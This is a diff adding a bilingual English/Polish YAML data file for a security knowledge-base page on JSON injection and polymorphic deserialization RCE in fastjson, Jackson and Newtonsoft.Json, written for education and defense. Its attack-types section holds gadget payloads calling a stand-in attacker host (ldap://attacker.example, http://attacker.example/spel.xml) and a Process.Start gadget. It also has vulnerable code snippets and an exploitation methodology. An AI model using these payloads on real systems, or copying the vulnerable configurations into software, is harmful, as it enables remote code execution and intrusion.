@@ -1,0 +1,399 @@
+meta:
+  id: jsoninjection
+  threatId: cat_1_research06
+  severity: Critical
+  color: '#0369a1'
+  colorRgb: 3,105,161
+  cwe: CWE-502
+  cvss: '9.8'
+  standard: OWASP A08:2021
+hero:
+  titleMain: 'JSON '
+  titleGrad: Injection
+  titleTail: ''
+  topbar: JSON Injection
+  lead:
+    en: 'Two mechanistically different threats sharing one name -- exactly the same split this knowledge base already documented for YAML Injection. Structural JSON injection is a plain data/syntax confusion: an app builds JSON by string concatenation, and a stray quote lets an attacker inject new keys. Polymorphic-deserialization RCE is tag-driven object instantiation: fastjson''s @type, Jackson''s default typing, and Newtonsoft.Json''s $type all let attacker-controlled JSON name the exact class to instantiate -- the same primitive as YAML''s !!tag deserialization, and just as capable of full RCE. A fastjson zero-day in this exact family was under active exploitation as this deep-dive was written.'
+    pl: 'Dwa mechanistycznie różne zagrożenia dzielące jedną nazwę -- dokładnie ten sam podział który ta baza wiedzy już udokumentowała dla YAML Injection. Strukturalne wstrzyknięcie JSON to zwykłe pomieszanie danych/składni: aplikacja buduje JSON przez konkatenację stringów, a zabłąkany cudzysłów pozwala atakującemu wstrzyknąć nowe klucze. RCE deserializacji polimorficznej to tworzenie instancji obiektu sterowane tagiem: @type fastjson, domyślne typowanie Jackson, i $type Newtonsoft.Json wszystkie pozwalają JSON kontrolowanemu przez atakującego nazwać dokładną klasę do utworzenia instancji -- ten sam prymityw co deserializacja !!tag YAML, i tak samo zdolny do pełnego RCE. Zero-day fastjson w dokładnie tej rodzinie był aktywnie eksploatowany gdy ten deep-dive był pisany.'
+  metrics:
+  - k: CWE-502
+    v:
+      en: Weakness ID (deserialization core, sibling to YAML)
+      pl: ID słabości (rdzeń deserializacji, siostrzane z YAML)
+  - k: '9.8'
+    v: CVSS · Critical (CVE-2017-7525)
+  - k: A08:2021
+    v: OWASP Top 10 (deserialization core)
+  - k: '6'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: CWE-502 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/502.html
+  - label: OWASP A08:2021
+    url: https://owasp.org/Top10/2021/A08_2021-Software_and_Data_Integrity_Failures/
+  - label: NVD — CVE-2017-7525 (Jackson-databind)
+    url: https://nvd.nist.gov/vuln/detail/CVE-2017-7525
+  - label: JFrog — CVE-2022-25845 (fastjson AutoType bypass)
+    url: https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/
+sectionOrder:
+- overview
+- types
+- code
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: 'Six variants across the two sub-families: structural syntax confusion (medium-high impact, no deserializer involved) and polymorphic-typing RCE (critical, tag-driven object instantiation across three major ecosystems). A historical, now-obsolete browser attack rounds out the picture for completeness.'
+      pl: 'Sześć wariantów w dwóch pod-rodzinach: pomieszanie składni strukturalnej (wpływ średni-wysoki, bez zaangażowania deserializatora) i RCE typowania polimorficznego (krytyczne, tworzenie instancji obiektu sterowane tagiem w trzech głównych ekosystemach). Historyczny, obecnie przestarzały atak przeglądarki zamyka obraz dla kompletności.'
+    items:
+    - name: Structural breakout via quoted-value injection
+      sev: high
+      description:
+        en: An app builds JSON by concatenation; an unescaped quote in user input closes the intended string value early and injects new keys. Duplicate-key handling is parser-dependent -- most take the last value, some the first -- and that ambiguity is itself an exploit primitive.
+        pl: Aplikacja buduje JSON przez konkatenację; nieoescapowany cudzysłów w wejściu użytkownika wcześnie zamyka zamierzoną wartość string i wstrzykuje nowe klucze. Obsługa zduplikowanych kluczy zależy od parsera -- większość bierze ostatnią wartość, niektóre pierwszą -- i ta niejednoznaczność sama w sobie jest prymitywem eksploatacji.
+      payload: name = alice","role":"admin   ->   {"name":"alice","role":"admin","role":"user"}
+    - name: Structural injection via nested objects/arrays
+      sev: high
+      description:
+        en: The same breakout technique injects an entire array or object the application never intended, corrupting authorization data or enabling a parser-differential attack when two components (e.g. a validating proxy and the backend) disagree on which value is authoritative.
+        pl: Ta sama technika wyłamania wstrzykuje całą tablicę lub obiekt których aplikacja nigdy nie zamierzała, korumpując dane autoryzacji albo umożliwiając atak różnicy parserów gdy dwa komponenty (np. walidujący proxy i backend) nie zgadzają się która wartość jest autorytatywna.
+      payload: x","perms":["read","write","admin"],"junk":"
+    - name: fastjson @type RCE (autoType)
+      sev: critical
+      description:
+        en: The namespace-style @type key names a live Java class to instantiate. The classic JdbcRowSetImpl gadget's dataSourceName setter triggers a JNDI lookup to an attacker LDAP/RMI server, achieving remote class loading and RCE -- the root of a multi-year autoType-bypass arms race across fastjson versions.
+        pl: Klucz @type w stylu przestrzeni nazw nazywa żywą klasę Java do utworzenia instancji. Setter dataSourceName klasycznego gadżetu JdbcRowSetImpl wywołuje wyszukiwanie JNDI do serwera LDAP/RMI atakującego, osiągając zdalne ładowanie klasy i RCE -- korzeń wieloletniego wyścigu zbrojeń obejść autoType w wersjach fastjson.
+      payload: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}'
+    - name: Jackson polymorphic deserialization RCE
+      sev: critical
+      description:
+        en: When an application calls enableDefaultTyping() (or misuses @JsonTypeInfo) on untrusted input, an attacker-supplied type array names any class on the classpath. This spawned a ~30-CVE blacklist-bypass family, each new CVE adding one more gadget class the previous blacklist missed -- exactly the pattern that led Jackson to replace blacklisting with an allowlist entirely.
+        pl: Gdy aplikacja wywołuje enableDefaultTyping() (albo nadużywa @JsonTypeInfo) na niezaufanym wejściu, tablica typu dostarczona przez atakującego nazywa dowolną klasę w classpath. To zapoczątkowało rodzinę ~30 CVE obejść blacklisty, każde nowe CVE dodające jedną kolejną klasę gadżetu której poprzednia blacklista nie wyłapała -- dokładnie wzorzec który doprowadził Jackson do całkowitego zastąpienia blacklisty allowlistą.
+      payload: '["org.springframework.context.support.ClassPathXmlApplicationContext","http://attacker.example/spel.xml"]'
+    - name: Newtonsoft.Json TypeNameHandling RCE
+      sev: critical
+      description:
+        en: 'Any TypeNameHandling setting other than None honors an attacker-supplied $type key. The ObjectDataProvider gadget invokes an arbitrary method (e.g. Process.Start) purely through property setters -- no code vulnerability in Newtonsoft.Json itself, just a dangerous, by-design configuration popularized at Black Hat USA 2017''s "Friday the 13th: JSON Attacks".'
+        pl: 'Każde ustawienie TypeNameHandling inne niż None honoruje dostarczony przez atakującego klucz $type. Gadżet ObjectDataProvider wywołuje dowolną metodę (np. Process.Start) czysto przez settery właściwości -- żadna podatność w kodzie samego Newtonsoft.Json, tylko niebezpieczna, zamierzona konfiguracja spopularyzowana na Black Hat USA 2017 "Friday the 13th: JSON Attacks".'
+      payload: '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}'
+    - name: JSON hijacking (historical, obsolete on modern browsers)
+      sev: low
+      description:
+        en: 'Circa 2006-2008: a top-level JSON array response is also valid JavaScript. A malicious page loading it via <script src> in old browsers could override the native Array constructor to steal the values cross-origin -- a pre-CORS data leak. ES5 forbade this constructor-override technique and JSON.parse replaced eval-based parsing, making this obsolete on any modern browser. Included for completeness, not as a live threat.'
+        pl: 'Około 2006-2008: odpowiedź tablicy JSON najwyższego poziomu jest też poprawnym JavaScript. Złośliwa strona ładująca ją przez <script src> w starych przeglądarkach mogła nadpisać natywny konstruktor Array by ukraść wartości cross-origin -- wyciek danych sprzed CORS. ES5 zabronił tej techniki nadpisania konstruktora a JSON.parse zastąpił parsowanie oparte na eval, czyniąc to przestarzałym w każdej nowoczesnej przeglądarce. Uwzględnione dla kompletności, nie jako żywe zagrożenie.'
+      payload: '[{"email":"victim@example.com","token":"secret"}]  (top-level array, pre-ES5 only)'
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'Two entirely different fixes for two entirely different problems: never concatenate JSON by hand (structural), and never let attacker input choose which class gets instantiated (deserialization).'
+      pl: 'Dwie zupełnie różne naprawy dla dwóch zupełnie różnych problemów: nigdy nie konkatenuj JSON ręcznie (strukturalne), i nigdy nie pozwól by wejście atakującego wybierało która klasa jest tworzona jako instancja (deserializacja).'
+    languages:
+    - label: Java (Jackson)
+      lang: java
+      vulnerable: '// VULNERABLE -- default typing honors attacker-supplied class names
+
+        ObjectMapper m = new ObjectMapper();
+
+        m.enableDefaultTyping();
+
+        Object o = m.readValue(untrustedJson, Object.class);'
+      safe: '// SECURE -- bind to a concrete type; if polymorphism is required, allowlist it
+
+        ObjectMapper m = new ObjectMapper();
+
+        Account a = m.readValue(untrustedJson, Account.class);
+
+        // PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
+
+        //     .allowIfSubType(Account.class).build();
+
+        // m.activateDefaultTyping(ptv, DefaultTyping.NON_FINAL);'
+    - label: Java (fastjson)
+      lang: java
+      vulnerable: '// VULNERABLE -- autoType reachable, @type honored
+
+        Object o = JSON.parseObject(untrustedJson, Object.class);'
+      safe: '// SECURE -- hard-disable autoType, bind to expected type, keep patched/migrate to fastjson2
+
+        ParserConfig.getGlobalInstance().setSafeMode(true);
+
+        Account a = JSON.parseObject(untrustedJson, Account.class);'
+    - label: C# (Newtonsoft.Json)
+      lang: csharp
+      vulnerable: '// VULNERABLE -- $type honored, any gadget on the classpath is reachable
+
+        var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };
+
+        var obj = JsonConvert.DeserializeObject<object>(untrustedJson, settings);'
+      safe: '// SECURE -- TypeNameHandling.None (the default); bind to a concrete DTO
+
+        var account = JsonConvert.DeserializeObject<Account>(untrustedJson);
+
+        // Prefer System.Text.Json, which has no type-name-from-payload behavior by default'
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: Structural injection and deserialization RCE need entirely different discovery techniques -- the first is found by breaking syntax, the second by confirming a library honors a type hint before ever touching a gadget.
+      pl: Wstrzyknięcie strukturalne i RCE deserializacji potrzebują zupełnie różnych technik odkrycia -- pierwsze znajduje się łamiąc składnię, drugie potwierdzając że biblioteka honoruje wskazówkę typu zanim w ogóle dotknie gadżetu.
+    steps:
+    - title:
+        en: 'Structural: probe with a lone quote and duplicate keys'
+        pl: 'Strukturalne: sonduj samotnym cudzysłowem i zduplikowanymi kluczami'
+      description:
+        en: A lone " triggers malformed-JSON errors if the sink is concatenation-built; a duplicate-key payload that survives round-trip confirms structural control and reveals first-wins vs last-wins semantics.
+        pl: Samotny " wywołuje błędy zniekształconego JSON jeśli sink jest zbudowany przez konkatenację; ładunek z duplikatem klucza który przetrwa round-trip potwierdza kontrolę strukturalną i ujawnia semantykę pierwszy-wygrywa vs ostatni-wygrywa.
+    - title:
+        en: 'Deserialization: fingerprint the library from error messages'
+        pl: 'Deserializacja: rozpoznaj bibliotekę z komunikatów błędów'
+      description:
+        en: Malformed JSON provokes a stack trace naming the library (com.alibaba.fastjson.*, com.fasterxml.jackson.*, Newtonsoft.Json.JsonSerializationException) -- each has its own type-hint key and gadget catalog.
+        pl: Zniekształcony JSON wywołuje ślad stosu nazywający bibliotekę (com.alibaba.fastjson.*, com.fasterxml.jackson.*, Newtonsoft.Json.JsonSerializationException) -- każda ma własny klucz wskazówki typu i katalog gadżetów.
+    - title:
+        en: Probe benignly with an out-of-band callback
+        pl: Sonduj niegroźnie callbackiem out-of-band
+      description:
+        en: A harmless typed value pointing at attacker infrastructure (e.g. a URL-fetching class) confirms the type hint is honored via a DNS/HTTP hit, without needing a working gadget yet.
+        pl: Niegroźna typowana wartość wskazująca na infrastrukturę atakującego (np. klasa pobierająca URL) potwierdza że wskazówka typu jest honorowana przez trafienie DNS/HTTP, bez potrzeby jeszcze działającego gadżetu.
+    - title:
+        en: Escalate with the fingerprinted gadget chain
+        pl: Eskaluj z rozpoznanym łańcuchem gadżetów
+      description:
+        en: JdbcRowSetImpl/TemplatesImpl for fastjson+JNDI, a Spring/logback gadget for Jackson, ObjectDataProvider for Newtonsoft.Json -- each library/version combination has a documented, version-specific catalog.
+        pl: JdbcRowSetImpl/TemplatesImpl dla fastjson+JNDI, gadżet Spring/logback dla Jackson, ObjectDataProvider dla Newtonsoft.Json -- każda kombinacja biblioteki/wersji ma udokumentowany, specyficzny dla wersji katalog.
+    - title:
+        en: For structural findings, chain into an authorization or logic bypass
+        pl: Dla znalezisk strukturalnych, powiąż z obejściem autoryzacji lub logiki
+      description:
+        en: There is no gadget chain to escalate through here -- the impact ceiling is whatever field the attacker's injected key can forge (role, price, permission array), so map which downstream field is trusted.
+        pl: Nie ma tu łańcucha gadżetów do eskalacji -- sufit wpływu to cokolwiek wstrzyknięty klucz atakującego może sfałszować (rola, cena, tablica uprawnień), więc zmapuj które pole downstream jest zaufane.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: The two sub-families need two separate primary fixes -- neither one substitutes for the other, exactly mirroring how this knowledge base's YAML deep-dive separates its deserialization fix from its CI/CD script-injection fix.
+      pl: Dwie pod-rodziny potrzebują dwóch osobnych podstawowych napraw -- żadna nie zastępuje drugiej, dokładnie odzwierciedlając jak deep-dive o YAML tej bazy wiedzy oddziela swoją naprawę deserializacji od naprawy wstrzyknięcia skryptu CI/CD.
+    items:
+    - rank: 1
+      eff: 99
+      kind: primary
+      label:
+        en: Never build JSON by string concatenation -- always use a serializer library
+        pl: Nigdy nie buduj JSON przez konkatenację stringów -- zawsze używaj biblioteki serializatora
+      note:
+        en: The structural-injection fix. writeValueAsString/JSON.stringify/System.Text.Json handle escaping correctly by construction -- the direct parallel to the YAML/XML injection core fix.
+        pl: Naprawa wstrzyknięcia strukturalnego. writeValueAsString/JSON.stringify/System.Text.Json obsługują escapowanie poprawnie z konstrukcji -- bezpośredni odpowiednik podstawowej naprawy wstrzyknięcia YAML/XML.
+    - rank: 2
+      eff: 98
+      kind: primary
+      label:
+        en: Disable polymorphic typing on untrusted input; bind to a concrete type
+        pl: Wyłącz typowanie polimorficzne na niezaufanym wejściu; wiąż do konkretnego typu
+      note:
+        en: The deserialization-RCE fix. Never enableDefaultTyping() (Jackson), never leave autoType reachable (fastjson), never set TypeNameHandling to anything but None (Newtonsoft.Json) on attacker-controlled data.
+        pl: Naprawa RCE deserializacji. Nigdy enableDefaultTyping() (Jackson), nigdy nie zostawiaj autoType osiągalnego (fastjson), nigdy nie ustawiaj TypeNameHandling na cokolwiek poza None (Newtonsoft.Json) na danych kontrolowanych przez atakującego.
+    - rank: 3
+      eff: 90
+      kind: strong
+      label:
+        en: If polymorphism is genuinely required, restrict to an explicit allowlist
+        pl: Jeśli polimorfizm jest naprawdę wymagany, ogranicz do jawnej allowlisty
+      note:
+        en: Jackson's PolymorphicTypeValidator, Newtonsoft's SerializationBinder, fastjson's safeMode + expected-class allowlist -- residual risk only if an allowlisted type is itself a gadget.
+        pl: PolymorphicTypeValidator Jackson, SerializationBinder Newtonsoft, safeMode fastjson + allowlista oczekiwanej klasy -- ryzyko resztkowe tylko jeśli sam typ na allowliście jest gadżetem.
+    - rank: 4
+      eff: 65
+      kind: mitigation
+      label:
+        en: Keep libraries patched against known gadget-chain CVEs
+        pl: Utrzymuj biblioteki załatane przeciw znanym CVE łańcucha gadżetów
+      note:
+        en: Necessary but historically insufficient alone -- both fastjson's autoType blacklist and Jackson's original gadget blacklist were repeatedly bypassed for years before each library moved to an allowlist model.
+        pl: Konieczne, ale historycznie samo w sobie niewystarczające -- zarówno blacklista autoType fastjson jak i oryginalna blacklista gadżetów Jackson były wielokrotnie omijane przez lata zanim każda biblioteka przeszła na model allowlist.
+    - rank: 5
+      eff: 50
+      kind: mitigation
+      label:
+        en: 'Runtime hardening: block outbound JNDI/LDAP/RMI egress'
+        pl: 'Utwardzenie w czasie wykonania: blokuj wychodzący ruch JNDI/LDAP/RMI'
+      note:
+        en: Disabling remote-codebase JNDI (trustURLCodebase=false) and restricting egress breaks the common RCE tail even if a gadget is reachable -- containment, not prevention.
+        pl: Wyłączenie zdalnego JNDI codebase (trustURLCodebase=false) i ograniczenie ruchu wychodzącego łamie częsty ogon RCE nawet jeśli gadżet jest osiągalny -- ograniczenie skutków, nie zapobieganie.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: The foundational fastjson and Jackson RCEs that each spawned a years-long bypass arms race, plus a live fastjson zero-day that all three independent research passes converged on identically -- including matching CVSS and version range -- while this deep-dive was being written.
+      pl: Fundamentalne RCE fastjson i Jackson które każde zapoczątkowało wieloletni wyścig zbrojeń obejść, plus żywy zero-day fastjson na który wszystkie trzy niezależne przejścia badawcze zbiegły się identycznie -- włącznie z pasującym CVSS i zakresem wersji -- podczas gdy ten deep-dive był pisany.
+    items:
+    - org: Alibaba fastjson
+      year: 2017
+      impact: CVE-2017-18349, CVSS 8.1
+      cost: Unauthenticated RCE, especially impactful across China-based enterprise Java software
+      description:
+        en: 'The original autoType RCE: fastjson <=1.2.24 shipped autoType on by default with no blacklist, so a JdbcRowSetImpl gadget''s dataSourceName setter reached a JNDI lookup. This CVE was the root of a multi-year bypass arms race (blacklist evasions through 1.2.47, safeMode introduced in 1.2.68) that never fully closed the class -- see CVE-2026-16723 below.'
+        pl: 'Oryginalne RCE autoType: fastjson <=1.2.24 wysyłał autoType włączony domyślnie bez blacklisty, więc setter dataSourceName gadżetu JdbcRowSetImpl dosięgał wyszukiwania JNDI. To CVE było korzeniem wieloletniego wyścigu zbrojeń obejść (obejścia blacklisty do 1.2.47, safeMode wprowadzony w 1.2.68) który nigdy w pełni nie zamknął tej klasy -- patrz CVE-2026-16723 poniżej.'
+    - org: FasterXML Jackson-databind
+      year: 2018
+      impact: CVE-2017-7525, CVSS 9.8
+      cost: Seed of a ~30-CVE blacklist-bypass family spanning years
+      description:
+        en: Fixed in 2.6.7.1/2.7.9.1/2.8.9. Required enableDefaultTyping() on untrusted input; each subsequent CVE in the family (CVE-2018-14721, CVE-2019-12384, and many more) added one new gadget class the previous blacklist missed -- the exact pattern that led Jackson 2.10 to replace blacklisting with the allowlist-based PolymorphicTypeValidator.
+        pl: Naprawione w 2.6.7.1/2.7.9.1/2.8.9. Wymagało enableDefaultTyping() na niezaufanym wejściu; każde kolejne CVE w rodzinie (CVE-2018-14721, CVE-2019-12384, i wiele więcej) dodawało jedną nową klasę gadżetu której poprzednia blacklista nie wyłapała -- dokładnie wzorzec który doprowadził Jackson 2.10 do zastąpienia blacklisty allowlistą opartą na PolymorphicTypeValidator.
+    - org: Alibaba fastjson
+      year: 2026
+      impact: CVE-2026-16723, CVSS ~9.0
+      cost: Actively exploited zero-day, no patch for the fastjson 1.x line at time of reporting
+      description:
+        en: All three independent research passes for this deep-dive converged on this exact CVE number, CVSS, and affected version range (1.2.68-1.2.83) independently -- unauthenticated RCE reachable under stock Spring Boot fat-jar deployment conditions, reportedly bypassing safeMode via third-party gadget classes. Remediation is migration to the fastjson2 rewrite; the 1.x line is treated as end-of-life for this issue.
+        pl: Wszystkie trzy niezależne przejścia badawcze dla tego deep-dive zbiegły się na dokładnie tym numerze CVE, CVSS, i dotkniętym zakresie wersji (1.2.68-1.2.83) niezależnie -- nieuwierzytelnione RCE osiągalne w standardowych warunkach wdrożenia fat-jar Spring Boot, podobno omijające safeMode przez klasy gadżetów stron trzecich. Remediacja to migracja do przepisania fastjson2; linia 1.x jest traktowana jako w końcu wsparcia dla tego problemu.
+    inlineSources:
+    - label: NVD — CVE-2017-7525 (Jackson-databind)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2017-7525
+    - label: JFrog — CVE-2022-25845 (fastjson AutoType bypass analysis)
+      url: https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/
+    - label: Imperva — CVE-2026-16723 (fastjson 1.x zero-day)
+      url: https://www.imperva.com/blog/imperva-customers-protected-against-cve-2026-16723-critical-fastjson-1-x-zero-day-rce/
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Deserialization misconfiguration is well-covered by mainstream SAST (dedicated rules exist for exactly this pattern); structural injection is caught by ordinary fuzzing rather than a dedicated rule.
+      pl: Błędna konfiguracja deserializacji jest dobrze pokryta przez główny SAST (istnieją dedykowane reguły dla dokładnie tego wzorca); wstrzyknięcie strukturalne jest wyłapywane przez zwykły fuzzing zamiast dedykowaną regułę.
+    sast:
+    - - CodeQL
+      - java/unsafe-deserialization flags Jackson enableDefaultTyping()/@JsonTypeInfo misuse; C# queries flag insecure TypeNameHandling
+    - - Semgrep
+      - Registry rules for enableDefaultTyping(), TypeNameHandling != None, and fastjson autoType/missing safeMode
+    - - Microsoft Roslyn analyzers
+      - CA2326 (avoid TypeNameHandling other than None) and CA2328 (JsonSerializerSettings must be secure), built into the .NET SDK
+    - - SCA (Snyk, Dependabot, OWASP Dependency-Check)
+      - Flag vulnerable jackson-databind/fastjson/Newtonsoft.Json versions against the CVE families above -- the most reliable automated signal given the blacklist-bypass history
+    dast:
+    - - Burp Suite + Collaborator/OAST
+      - A benign type probe pointing at attacker infrastructure confirms a live polymorphic sink via a DNS/HTTP callback, without needing a working gadget yet
+    - - Manual quote/brace fuzzing
+      - 'Structural injection detection: inject a lone " and duplicate keys, watch for malformed-JSON errors or forged-field effects'
+    note:
+      en: <strong>Key signal:</strong> grep for enableDefaultTyping()/@JsonTypeInfo(use=CLASS), fastjson calls without safeMode, and any TypeNameHandling setting other than None -- these are a small, greppable set of dangerous configurations, unlike structural injection which requires reviewing every hand-built JSON string.
+      pl: <strong>Kluczowy sygnał:</strong> szukaj enableDefaultTyping()/@JsonTypeInfo(use=CLASS), wywołań fastjson bez safeMode, i jakiegokolwiek ustawienia TypeNameHandling innego niż None -- to mały, łatwy do wyszukania zbiór niebezpiecznych konfiguracji, w przeciwieństwie do wstrzyknięcia strukturalnego które wymaga przeglądu każdego ręcznie zbudowanego stringa JSON.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: 'The mapping mirrors this knowledge base''s own YAML Injection deep-dive exactly: no dedicated CWE exists for the syntax-confusion variant, while the deserialization variant shares its CWE and OWASP category directly with YAML''s tag-driven core -- confirming both are genuinely the same weakness family, just different serialization formats.'
+      pl: 'Mapowanie dokładnie odzwierciedla własny deep-dive o YAML Injection tej bazy wiedzy: nie istnieje dedykowane CWE dla wariantu pomieszania składni, podczas gdy wariant deserializacji dzieli swoje CWE i kategorię OWASP bezpośrednio z rdzeniem sterowanym tagiem YAML -- potwierdzając że oba są naprawdę tą samą rodziną słabości, tylko różnymi formatami serializacji.'
+    items:
+    - std: CWE (MITRE)
+      items:
+      - No dedicated "JSON injection" CWE exists for the structural variant -- unlike XML, which has its own CWE-91. It maps to the general CWE-74 (Improper Neutralization of Special Elements) and specifically CWE-116 (Improper Encoding or Escaping of Output) for the root cause
+      - CWE-502 — Deserialization of Untrusted Data, for the polymorphic-typing RCE variant -- the exact same CWE this knowledge base's YAML Injection deep-dive uses for its deserialization core, confirming JSON polymorphic typing and YAML tag deserialization are siblings under one weakness
+    - std: OWASP
+      items:
+      - A03:2021 — Injection, for the structural variant
+      - A08:2021 — Software and Data Integrity Failures, for the deserialization variant -- mirroring the exact A03-vs-A08 split this knowledge base's YAML deep-dive already established
+    inlineSources:
+    - label: CWE-502 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/502.html
+    - label: CWE-74 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/74.html
+    - label: CWE-116 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/116.html
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+    - label: OWASP A08:2021
+      url: https://owasp.org/Top10/2021/A08_2021-Software_and_Data_Integrity_Failures/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If active JSON injection or deserialization exploitation is confirmed, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji wstrzyknięcia JSON lub deserializacji, przejdź tę listę od góry.
+    steps:
+    - en: Determine which sub-family was exploited first -- structural (authz/logic impact) or deserialization (RCE) -- since the remediation and blast radius differ completely
+      pl: Ustal która pod-rodzina została wykorzystana -- strukturalna (wpływ autoryzacji/logiki) czy deserializacja (RCE) -- bo remediacja i zasięg skutków całkowicie się różnią
+    - en: If RCE is confirmed, treat the host as fully compromised -- rotate all credentials/secrets reachable from that process
+      pl: Jeśli RCE jest potwierdzone, traktuj hosta jako w pełni skompromitowanego -- zrotuj wszystkie poświadczenia/sekrety osiągalne z tego procesu
+    - en: Identify the exact JSON library and version in use, and check it against the fastjson/Jackson/Newtonsoft.Json CVE families above
+      pl: Zidentyfikuj dokładną używaną bibliotekę JSON i wersję, sprawdź ją względem powyższych rodzin CVE fastjson/Jackson/Newtonsoft.Json
+    - en: Grep the codebase for every enableDefaultTyping()/@JsonTypeInfo(use=CLASS)/TypeNameHandling!=None/missing-safeMode call site, not just the one exploited
+      pl: Przeszukaj kod pod kątem każdego miejsca wywołania enableDefaultTyping()/@JsonTypeInfo(use=CLASS)/TypeNameHandling!=None/brakującego safeMode, nie tylko tego które zostało wykorzystane
+    - en: Switch every unavoidable dynamic-typing call site to an explicit allowlist (PolymorphicTypeValidator/SerializationBinder), never a tighter blacklist
+      pl: Przełącz każde nieuniknione miejsce dynamicznego typowania na jawną allowlistę (PolymorphicTypeValidator/SerializationBinder), nigdy na ciaśniejszą blacklistę
+    - en: Check outbound connection logs for unexpected JNDI/LDAP/RMI callbacks to unfamiliar hosts
+      pl: Sprawdź logi połączeń wychodzących pod kątem nieoczekiwanych callbacków JNDI/LDAP/RMI do nieznanych hostów
+    - en: Notify per applicable data-breach obligations if data was exfiltrated
+      pl: Powiadom zgodnie z obowiązującymi wymogami dot. naruszenia danych jeśli dane zostały eksfiltrowane
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+    - label: OWASP A08:2021
+      url: https://owasp.org/Top10/2021/A08_2021-Software_and_Data_Integrity_Failures/
+    - label: CWE-502 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/502.html
+    - label: CWE-74 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/74.html
+    - label: CWE-116 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/116.html
+    - label: NVD — CVE-2017-7525 (Jackson-databind)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2017-7525
+    - label: JFrog — CVE-2022-25845 (fastjson AutoType bypass)
+      url: https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/
+    - label: Imperva — CVE-2026-16723 (fastjson 1.x zero-day)
+      url: https://www.imperva.com/blog/imperva-customers-protected-against-cve-2026-16723-critical-fastjson-1-x-zero-day-rce/
+    - label: PortSwigger Research — JSON hijacking for the modern web
+      url: https://portswigger.net/research/json-hijacking-for-the-modern-web
